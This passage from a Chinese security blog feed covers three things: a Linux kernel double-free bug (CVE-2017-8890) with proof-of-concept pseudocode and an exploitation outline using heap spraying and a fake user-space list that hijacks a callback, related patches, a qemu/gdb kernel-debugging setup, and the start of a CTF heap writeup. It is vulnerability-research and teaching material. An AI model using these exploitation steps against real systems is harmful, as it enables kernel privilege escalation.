class="keyword">gfp_t</span> priority)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">newsk</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> is_charged = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    newsk = sk_prot_alloc(sk-&gt;sk_prot, priority, sk-&gt;sk_family);</span><br><span class="line">    <span class="keyword">if</span> (newsk != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_filter</span> *<span class="title">filter</span>;</span></span><br><span class="line"></span><br><span class="line">    sock_copy(newsk, sk);<span class="comment">//&lt;-----</span></span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">return</span> newsk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copy all fields from osk to nsk but nsk-&gt;sk_refcnt must not change yet,</span></span><br><span class="line"><span class="comment"> * even temporarly, because of RCU lookups. sk_node should also be left as is.</span></span><br><span class="line"><span class="comment"> * We must not copy fields between sk_dontcopy_begin and sk_dontcopy_end</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sock_copy</span><span class="params">(struct sock *nsk, <span class="keyword">const</span> struct sock *osk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY_NETWORK</span></span><br><span class="line"><span class="keyword">void</span> *sptr = nsk-&gt;sk_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="built_in">memcpy</span>(nsk, osk, offsetof(struct sock, sk_dontcopy_begin));</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;nsk-&gt;sk_dontcopy_end, &amp;osk-&gt;sk_dontcopy_end,</span><br><span class="line">       osk-&gt;sk_prot-&gt;obj_size - offsetof(struct sock, sk_dontcopy_end));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY_NETWORK</span></span><br><span class="line">nsk-&gt;sk_security = sptr;</span><br><span class="line">security_sk_clone(osk, nsk);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** struct inet_sock - representation of INET sockets</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @sk - ancestor class</span></span><br><span class="line"><span class="comment"> * @pinet6 - pointer to IPv6 control block</span></span><br><span class="line"><span class="comment"> * @inet_daddr - Foreign IPv4 addr</span></span><br><span class="line"><span class="comment"> * @inet_rcv_saddr - Bound local IPv4 addr</span></span><br><span class="line"><span class="comment"> * @inet_dport - Destination port</span></span><br><span class="line"><span class="comment"> * @inet_num - Local port</span></span><br><span class="line"><span class="comment"> * @inet_saddr - Sending source</span></span><br><span class="line"><span class="comment"> * @uc_ttl - Unicast TTL</span></span><br><span class="line"><span class="comment"> * @inet_sport - Source port</span></span><br><span class="line"><span class="comment"> * @inet_id - ID counter for DF pkts</span></span><br><span class="line"><span class="comment"> * @tos - TOS</span></span><br><span class="line"><span class="comment"> * @mc_ttl - Multicasting TTL</span></span><br><span class="line"><span class="comment"> * @is_icsk - is this an inet_connection_sock?</span></span><br><span class="line"><span class="comment"> * @uc_index - Unicast outgoing device index</span></span><br><span class="line"><span class="comment"> * @mc_index - Multicast device index</span></span><br><span class="line"><span class="comment"> * @mc_list - Group array</span></span><br><span class="line"><span class="comment"> * @cork - info to build ip hdr on each ip frag while socket is corked</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> &#123;</span></span><br><span class="line"><span class="comment">/* sk and pinet6 has to be the first two members of inet_sock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span><span class="title">sk</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_IPV6)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipv6_pinfo</span>*<span class="title">pinet6</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Socket demultiplex comparisons on incoming packets. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inet_daddrsk.__sk_common.skc_daddr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inet_rcv_saddrsk.__sk_common.skc_rcv_saddr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inet_dportsk.__sk_common.skc_dport</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inet_numsk.__sk_common.skc_num</span></span><br><span class="line"></span><br><span class="line">__be32inet_saddr;</span><br><span class="line">__s16uc_ttl;</span><br><span class="line">__u16cmsg_flags;</span><br><span class="line">__be16inet_sport;</span><br><span class="line">__u16inet_id;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_options_rcu</span> __<span class="title">rcu</span>*<span class="title">inet_opt</span>;</span></span><br><span class="line"><span class="keyword">int</span>rx_dst_ifindex;</span><br><span class="line">__u8tos;</span><br><span class="line">__u8min_ttl;</span><br><span class="line">__u8mc_ttl;</span><br><span class="line">__u8pmtudisc;</span><br><span class="line">__u8recverr:<span class="number">1</span>,</span><br><span class="line">is_icsk:<span class="number">1</span>,</span><br><span class="line">freebind:<span class="number">1</span>,</span><br><span class="line">hdrincl:<span class="number">1</span>,</span><br><span class="line">mc_loop:<span class="number">1</span>,</span><br><span class="line">transparent:<span class="number">1</span>,</span><br><span class="line">mc_all:<span class="number">1</span>,</span><br><span class="line">nodefrag:<span class="number">1</span>;</span><br><span class="line">__u8bind_address_no_port:<span class="number">1</span>;</span><br><span class="line">__u8rcv_tos;</span><br><span class="line">__u8convert_csum;</span><br><span class="line"><span class="keyword">int</span>uc_index;</span><br><span class="line"><span class="keyword">int</span>mc_index;</span><br><span class="line">__be32mc_addr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_mc_socklist</span> __<span class="title">rcu</span>*<span class="title">mc_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_cork_full</span><span class="title">cork</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><strong>在accecpt的时候，创建一个新的socket的，parent的所有field(除了ref_cnt)被拷贝给新生成的socket对象，包括mc_list指针的值，于是就有了多个指针指向同一块内存，从而在后面造成double free。</strong></p><h2 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sockfd = socket(AF_INET, xx, IPPROTO_TCP);</span><br><span class="line">setsockopt(sockfd, SOL_IP, MCAST_JOIN_GROUP, xxxx, xxxx);</span><br><span class="line">bind(sockfd, xxxx, xxxx);</span><br><span class="line">listen(sockfd, xxxx);</span><br><span class="line">newsockfd = accept(sockfd, xxxx, xxxx);</span><br><span class="line">close(newsockfd);// first free (kfree_rcu)</span><br><span class="line">sleep(5);// wait rcu free(real first free)</span><br><span class="line">close(sockfd);// double free</span><br></pre></td></tr></table></figure><ul><li><p>int socket(int af, int type, int protocol);<br>1) af 为地址族（Address Family），也就是 IP 地址类型，常用的有 AF_INET 和 AF_INET6。AF 是“Address Family”的简写，INET是“Inetnet”的简写。AF_INET 表示 IPv4 地址，例如 127.0.0.1；AF_INET6 表示 IPv6 地址，例如 1030::C9B4:FF12:48AA:1A2B。<br>你也可以使用PF前缀，PF是“Protocol Family”的简写，它和AF是一样的。例如，PF_INET 等价于 AF_INET，PF_INET6 等价于 AF_INET6。<br>2) type 为数据传输方式，常用的有 SOCK_STREAM 和 SOCK_DGRAM,<br>3) protocol 表示传输协议，常用的有 IPPROTO_TCP 和 IPPTOTO_UDP，分别表示 TCP 传输协议和 UDP 传输协议。</p></li><li><p>int setsockopt(int sock, int level, int optname, void <em>optval, socklen_t </em>optlen);<br>参数：<br>sock：将要被设置或者获取选项的套接字。<br>level：选项所在的协议层。<br>optname：需要访问的选项名。<br>optval：对于getsockopt()，指向返回选项值的缓冲。 对于setsockopt()，指向包含新选项值的缓冲。<br>optlen：对于getsockopt()，作为入口参数时，选项值的最大长度。 作为出口参数时，选项值的实际长度。 对于setsockopt()，现选项的长度。</p></li><li>int bind(int sock, struct sockaddr *addr, socklen_t addrlen);  //Linux<br>sock 为 socket 文件描述符，addr 为 sockaddr 结构体变量的指针，addrlen 为 addr 变量的大小，可由 sizeof() 计算得出。<br><a href="http://c.biancheng.net/cpp/html/3033.html" target="_blank" rel="noopener">http://c.biancheng.net/cpp/html/3033.html</a></li><li>int listen(int sock, int backlog);  //Linux<br>sock 为需要进入监听状态的套接字，backlog 为请求队列的最大长度。<br>所谓被动监听，是指当没有客户端请求时，套接字处于“睡眠”状态，只有当接收到客户端请求时，套接字才会被“唤醒”来响应请求。<br>注意：listen() 只是让套接字处于监听状态，并没有接收请求。接收请求需要使用 accept() 函数。</li><li>int accept(int sock, struct sockaddr <em>addr, socklen_t </em>addrlen);  //Linux<br>它的参数与 listen() 和 connect() 是相同的：sock 为服务器端套接字，addr 为 sockaddr_in 结构体变量，addrlen 为参数 addr 的长度，可由 sizeof() 求得。<br><strong>accept() 返回一个新的套接字来和客户端通信，addr 保存了客户端的IP地址和端口号，而 sock 是服务器端的套接字，大家注意区分。后面和客户端通信时，要使用这个新生成的套接字，而不是原来服务器端的套接字。</strong><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+ mc_list 在内核中以链表形式存在，通过第一个成员next_rcu指向下一个mc_list</span><br><span class="line"></span><br><span class="line">+ 当要释放一个mc_list的时候，rcu_head会被链到一个释放链表中</span><br><span class="line"></span><br><span class="line">+ 我们可以在用户态伪造一个fake_mc_list，让被堆喷的对象的next_rcu指向用户态的fake_mc_list</span><br><span class="line"></span><br><span class="line">那么最终的利用思路如下：</span><br><span class="line"></span><br><span class="line">+ 用户态创建结构 fake_mc_list</span><br><span class="line"></span><br><span class="line">+ mmap(fake_mc_list)</span><br><span class="line"></span><br><span class="line">+ 创建漏洞结构体</span><br><span class="line"></span><br><span class="line">+ 第一次释放</span><br><span class="line"></span><br><span class="line">+ 堆喷占位，覆盖被释放对象的next_rcu</span><br><span class="line"></span><br><span class="line">+ 第二次释放，使 fake_mc_list 上链</span><br><span class="line"></span><br><span class="line">+ fake_mc_list.rcu-&gt;func 为 JOP 地址</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-19-034709.jpg" alt=""></p><h2 id="漏洞模型"><a href="#漏洞模型" class="headerlink" title="漏洞模型"></a>漏洞模型</h2><h3 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h3><p>事实上类似的模式早就被commit过patch<br><a href="https://github.com/torvalds/linux/commit/8b485ce69876c65db12ed390e7f9c0d2a64eff2c" target="_blank" rel="noopener">https://github.com/torvalds/linux/commit/8b485ce69876c65db12ed390e7f9c0d2a64eff2c</a><br>所以多看commit很重要，可以学习挖洞的模式。<br>可以看一下说明，提到了double free，触发地点也很接近。</p><p><strong>tcp: do not inherit fastopen_req from parent</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcp: do not inherit fastopen_req from parent</span><br><span class="line"></span><br><span class="line">Under fuzzer stress, it is possible that a child gets a non NULL</span><br><span class="line">fastopen_req pointer from its parent at accept() time, when/if parent</span><br><span class="line">morphs from listener to active session.</span><br><span class="line"></span><br><span class="line">We need to make sure this can not happen, by clearing the field after</span><br><span class="line">socket cloning.</span><br><span class="line"></span><br><span class="line">BUG: Double free or freeing an invalid pointer</span><br></pre></td></tr></table></figure></p><p><strong>patch</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">newicsk-&gt;icsk_ack.last_seg_size = skb-&gt;len - newtp-&gt;tcp_header_len;</span><br><span class="line"> newtp-&gt;rx_opt.mss_clamp = req-&gt;mss;</span><br><span class="line"> tcp_ecn_openreq_child(newtp, req);</span><br><span class="line">+newtp-&gt;fastopen_req = NULL;</span><br><span class="line"> newtp-&gt;fastopen_rsk = NULL;</span><br><span class="line"> newtp-&gt;syn_data_acked = 0;</span><br><span class="line"> newtp-&gt;rack.mstamp.v64 = 0;</span><br></pre></td></tr></table></figure></p><h3 id="CVE-2017-9075"><a href="#CVE-2017-9075" class="headerlink" title="CVE-2017-9075"></a>CVE-2017-9075</h3><h4 id="do-not-inherit-ipv6-mc-ac-fl-list-from-parent"><a href="#do-not-inherit-ipv6-mc-ac-fl-list-from-parent" class="headerlink" title="do not inherit ipv6_{mc|ac|fl}_list from parent"></a>do not inherit ipv6_{mc|ac|fl}_list from parent</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sctp: do not inherit ipv6_&#123;mc|ac|fl&#125;_list from parent</span><br><span class="line">SCTP needs fixes similar to 83eaddab4378 (&quot;ipv6/dccp: do not inherit</span><br><span class="line">ipv6_mc_list from parent&quot;), otherwise bad things can happen.</span><br></pre></td></tr></table></figure><h4 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+++ b/net/sctp/ipv6.c</span><br><span class="line">@@ -677,6 +677,9 @@ static struct sock *sctp_v6_create_accept_sk(struct sock *sk,</span><br><span class="line"> newnp = inet6_sk(newsk);</span><br><span class="line"> </span><br><span class="line"> memcpy(newnp, np, sizeof(struct ipv6_pinfo));</span><br><span class="line">+newnp-&gt;ipv6_mc_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_ac_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_fl_list = NULL;</span><br><span class="line"> </span><br><span class="line"> rcu_read_lock();</span><br><span class="line"> opt = rcu_dereference(np-&gt;opt);</span><br></pre></td></tr></table></figure><h3 id="CVE-2017-9076-CVE-2017-9077"><a href="#CVE-2017-9076-CVE-2017-9077" class="headerlink" title="CVE-2017-9076/CVE-2017-9077"></a>CVE-2017-9076/CVE-2017-9077</h3><h4 id="ipv6-dccp-do-not-inherit-ipv6-mc-list-from-parent"><a href="#ipv6-dccp-do-not-inherit-ipv6-mc-list-from-parent" class="headerlink" title="ipv6/dccp: do not inherit ipv6_mc_list from parent"></a>ipv6/dccp: do not inherit ipv6_mc_list from parent</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Like commit 657831ffc38e (&quot;dccp/tcp: do not inherit mc_list from parent&quot;)</span><br><span class="line">we should clear ipv6_mc_list etc. for IPv6 sockets too.</span><br></pre></td></tr></table></figure><h4 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/net/dccp/ipv6.c b/net/dccp/ipv6.c</span><br><span class="line">index d9b6a4e..b6bbb71 100644</span><br><span class="line">--- a/net/dccp/ipv6.c</span><br><span class="line">+++ b/net/dccp/ipv6.c</span><br><span class="line">@@ -426,6 +426,9 @@ static struct sock *dccp_v6_request_recv_sock(const struct sock *sk,</span><br><span class="line"> newsk-&gt;sk_backlog_rcv = dccp_v4_do_rcv;</span><br><span class="line"> newnp-&gt;pktoptions  = NULL;</span><br><span class="line"> newnp-&gt;opt   = NULL;</span><br><span class="line">+newnp-&gt;ipv6_mc_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_ac_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_fl_list = NULL;</span><br><span class="line"> newnp-&gt;mcast_oif   = inet6_iif(skb);</span><br><span class="line"> newnp-&gt;mcast_hops  = ipv6_hdr(skb)-&gt;hop_limit;</span><br><span class="line"> </span><br><span class="line">@@ -490,6 +493,9 @@ static struct sock *dccp_v6_request_recv_sock(const struct sock *sk,</span><br><span class="line"> /* Clone RX bits */</span><br><span class="line"> newnp-&gt;rxopt.all = np-&gt;rxopt.all;</span><br><span class="line"> </span><br><span class="line">+newnp-&gt;ipv6_mc_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_ac_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_fl_list = NULL;</span><br><span class="line"> newnp-&gt;pktoptions = NULL;</span><br><span class="line"> newnp-&gt;opt  = NULL;</span><br><span class="line"> newnp-&gt;mcast_oif  = inet6_iif(skb);</span><br><span class="line">diff --git a/net/ipv6/tcp_ipv6.c b/net/ipv6/tcp_ipv6.c</span><br><span class="line">index aeb9497..df5a9ff 100644</span><br><span class="line">--- a/net/ipv6/tcp_ipv6.c</span><br><span class="line">+++ b/net/ipv6/tcp_ipv6.c</span><br><span class="line">@@ -1062,6 +1062,7 @@ static struct sock *tcp_v6_syn_recv_sock(const struct sock *sk, struct sk_buff *</span><br><span class="line"> newtp-&gt;af_specific = &amp;tcp_sock_ipv6_mapped_specific;</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line">+newnp-&gt;ipv6_mc_list = NULL;</span><br><span class="line"> newnp-&gt;ipv6_ac_list = NULL;</span><br><span class="line"> newnp-&gt;ipv6_fl_list = NULL;</span><br><span class="line"> newnp-&gt;pktoptions  = NULL;</span><br><span class="line">@@ -1131,6 +1132,7 @@ static struct sock *tcp_v6_syn_recv_sock(const struct sock *sk, struct sk_buff *</span><br><span class="line">    First: no IPv4 options.</span><br><span class="line">  */</span><br><span class="line"> newinet-&gt;inet_opt = NULL;</span><br><span class="line">+newnp-&gt;ipv6_mc_list = NULL;</span><br><span class="line"> newnp-&gt;ipv6_ac_list = NULL;</span><br><span class="line"> newnp-&gt;ipv6_fl_list = NULL;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://2freeman.github.io/2018/01/06/CVE-2017-8890-internals.html" target="_blank" rel="noopener">https://2freeman.github.io/2018/01/06/CVE-2017-8890-internals.html</a><br><a href="https://bbs.pediy.com/thread-226057.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226057.htm</a><br><a href="http://www.freebuf.com/articles/terminal/160041.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/terminal/160041.html</a></p>]]></content>
      
      <categories>
          
          <category> kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>qemu+gdb kernel调试环境搭建</title>
      <link href="/2018/04/13/qemu/"/>
      <url>/2018/04/13/qemu/</url>
      <content type="html"><![CDATA[<p>这个最后是失败了的，各种原因吧，主要是gdb版本的问题，我又不想重新编译gdb就放弃了这个方法，不过供其他想要搭建qemu+gdb的人参考吧，毕竟我也折腾老半天了。。<br>可能以后哪天成功了回来更新一下。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/hit/once$ uname -a</span><br><span class="line">Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">parallels@ubuntu:~/ctf/hit/once$ gcc -v</span><br><span class="line">gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9)</span><br></pre></td></tr></table></figure><h2 id="下kernel-source-code，解压"><a href="#下kernel-source-code，解压" class="headerlink" title="下kernel source code，解压"></a>下kernel source code，解压</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.10.1.tar.gz</span><br><span class="line">tar -xzvf linux-4.10.1.tar.gz //解压tar.gz</span><br></pre></td></tr></table></figure><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential libncurses5-dev</span><br></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><ol><li><p>make menuconfig<br>进入kernel hacking<br>勾选以下项目<br>Kernel debugging<br>Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers<br>KGDB<br>然后保存退出</p></li><li><p>make bzImage<br>提示如下信息则编译成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Setup is 17436 bytes (padded to 17920 bytes).</span><br><span class="line">System is 7063 kB</span><br><span class="line">CRC 78823741</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure></li><li><p>从kernel source code根目录取到vmlinux，从arch/x86/boot/取到bzImage</p></li></ol><h2 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.27.2.tar.bz2</span><br><span class="line">tar -jxvf busybox-1.27.2.tar.bz2</span><br><span class="line">cd busybox-1.27.2</span><br><span class="line">make menuconfig # Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="建立文件系统（busybox"><a href="#建立文件系统（busybox" class="headerlink" title="建立文件系统（busybox)"></a>建立文件系统（busybox)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd _install</span><br><span class="line">mkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">vim etc/inittab</span><br><span class="line">添加以下内容</span><br><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br><span class="line"></span><br><span class="line">mkdir etc/init.d</span><br><span class="line">vim etc/init.d/rcS </span><br><span class="line">添加以下内容</span><br><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sys none /sys</span><br><span class="line">/bin/mount -n -t sysfs none /sys</span><br><span class="line">/bin/mount -t ramfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"></span><br><span class="line">chmod +x ./etc/init.d/rcS</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; ~/core/rootfs.img</span><br><span class="line">gzip -c rootfs.img &gt; rootfs.img.gz</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0ctf2018 heapstorm2 writeup</title>
      <link href="/2018/04/03/heapstorm2/"/>
      <url>/2018/04/03/heapstorm2/</url>
      <content type="html"><![CDATA[<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/heapstorm2" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/heapstorm2</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li><p>mallopt<br>int mallopt(int param,int value) param的取值分别为M_MXFAST，value是以字节为单位。<br>M_MXFAST:定义使用fastbins的内存请求大小的上限，小于该阈值的小块内存请求将不会使用fastbins获得内存，其缺省值为64。下面我们来将M_MXFAST设置为0，禁止使用fastbins<br><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.h.html" target="_blank" rel="noopener">源码</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">102</span>     <span class="meta">#<span class="meta-keyword">ifndef</span> M_MXFAST</span></span><br><span class="line"><span class="number">103</span><span class="meta"># <span class="meta-keyword">define</span> M_MXFAST  1    <span class="comment">/* maximum request size for "fastbins" */</span></span></span><br><span class="line"><span class="number">104</span><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span 